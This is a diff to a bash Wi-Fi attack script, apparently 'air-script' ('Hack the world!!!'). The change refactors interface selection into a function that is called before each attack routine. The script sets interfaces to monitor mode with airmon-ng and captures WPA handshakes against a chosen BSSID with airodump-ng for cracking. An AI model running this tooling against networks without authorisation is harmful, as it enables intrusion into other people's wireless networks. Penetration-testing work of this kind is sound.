@@ -6,15 +6,14 @@ if [ $(id -u) -ne 0 ]; then
 	echo "This script must be ran as root"
 	exit 1
 fi
+network () {
 echo "Please, select a network interface:"
 cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
-
 airmon-ng start $foo
-
 echo "Please, select the interface in monitor mode:"
 cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
-
 cd /home/*/air-script
+}
 chmod -R 755 *
 sudo postfix start> /dev/null 2>&1
 clear
@@ -76,7 +75,7 @@ echo -e "${Red}
          ░                                  "
 echo -e "${Yellow} \n             Hack the world!!!     "
 echo -e "${Green}\n                    Developed by: Liam Bendix"
-echo -e "${Green}                         Version: 1.0.8 Stable"
+echo -e "${Green}                         Version: 1.0.6 Stable"
 }
 
 menu () {        ##### Display available options #####
@@ -241,6 +240,7 @@ echo "Enter your email address for notifications: " email
 read email
 echo "Remember to check your spam folder!"
 sleep 3
+network
 PiScan
 monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
@@ -258,6 +258,7 @@ crack
 
 
 attackNo () {
+network
 PiScan
 monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
@@ -305,6 +306,7 @@ echo "Enter your email address for notifications: " email
 read email
 sleep 3
 echo "Remeber to check your spam folder!"
+network
 PiPwn
 sudo airmon-ng check kill
 sudo airmon-ng
@@ -322,6 +324,7 @@ crack
 
 
 attackAllNo () {
+network
 PiPwn
 sudo airmon-ng check kill
 sudo airmon-ng
